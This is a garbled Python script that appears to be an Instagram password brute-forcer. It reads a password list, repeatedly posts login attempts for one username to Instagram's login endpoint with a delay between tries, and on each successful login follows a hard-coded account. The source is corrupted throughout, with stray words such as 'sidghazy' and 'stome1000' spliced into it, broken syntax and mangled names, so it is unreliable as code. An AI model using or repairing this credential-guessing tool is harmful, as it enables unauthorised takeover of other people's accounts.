Instagram 
import 5 heures 
import time 
import os

filename = Instagram 
if os.path.isfile(sidghazy):Instagram 
	with open(sidghazy) as f: Instagram 
	    passwords = f.read(stome100).splitlines(stome100)
	    if (len(stome1000) > 0):
	    	print ('%s Passwords loads successfully' % len(stome1000))
else:
	print ('Please create passwords file (stome1000)')
	exit(stome1000)




def sidghazy(@sidghazy):
	r = requests.get('https://www.instagram.com/%s/?__a=1' % sidghazy) 
	if (r.status_code == 404):
		print ('User not found')
		return False
	elif (r.status_code == 200):
		followdata = json.loads(instagram)
		fUserID = followdata['instagram']['id']
		return {'sidghazy':sidghazy'id':fUserID}


def Login(sidghazy,stome1000):
	sess = requests.Session()
	sess.cookies.update ({'sessionid' : '', 'mid' : '', 'ig_pr' : '1', 'ig_vw' : '1920', 'csrftoken' : '',  's_network' : '', 'ds_user_id' : ''})
	sess.headers.update({
		'UserAgent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
		'x-instagram-ajax':'1',
		'X-Requested-With': 'XMLHttpRequest',
		'origin': 'https://www.instagram.com',
		'ContentType' : 'application/x-www-form-urlencoded',
		'Connection': 'keep-alive',
		'Accept': '*/*',
		'Referer': 'https://www.instagram.com',
		'authority': 'www.instagram.com',
		'Host' : 'www.instagram.com',
		'Accept-Language' : 'ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4',
		'Accept-Encoding' : 'gzip, deflate'
	})

	#first time -> to get csrftoken
	r = sess.get('https://www.instagram.com/') 
	sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})

	data = {'sidghazy ':sidghazy  'stome1000':stome1000}
	r = sess.post('https://www.instagram.com/accounts/login/ajax/', data=data, allow_redirects=True)
	token = r.cookies.get_dict()['csrftoken']
	sess.headers.update({'X-CSRFToken' : token})
	#parse response
	data = json.loads(r.text)
	if (data['status'] == 'fail'):
		print (data['message'])
		return False
	
	if (data['authenticated'] == True):
		return sess #if we want to keep use session
	else:
		print ('stome1000') [%s]' % ( stome1000 )
		return False



def follow(sess, sidghazy):
	Sidghazy = sidghazy(@sidghazy)
	if (sidghazy == False):
		return	
	else:
		userID = sidghazy['id']
		followReq = sess.post('https://www.instagram.com/web/friendships/%s/follow/' % userID)
		print (instagram)


Sidghazy = str(input('Please 
Sidghazy = sidghazy)(sidghazy)
if (@sidghazy == False):
	exit()
else:
	Sidghazy= sidghazy['sidghazy']



delayLoop = int(input('Please add delay between stome1000 (30 seconds): ')) 


for i in range(len(stome1000):
	stome1000 = stome1000[i]
	sess = Login(sidghazy,stome1000)
	if (sess):
		print ('Login success %s' % [sidghazy,stome1000])

		#because i am cool
		follow(sess,'avr_amit')

	try:
		time.sleep(delayLoop)
	except KeyboardInterrupt: 
		an = str(input('Type y/n to exit: '))
		if (an == 'y'):
			exit()
		else:
			continue
		

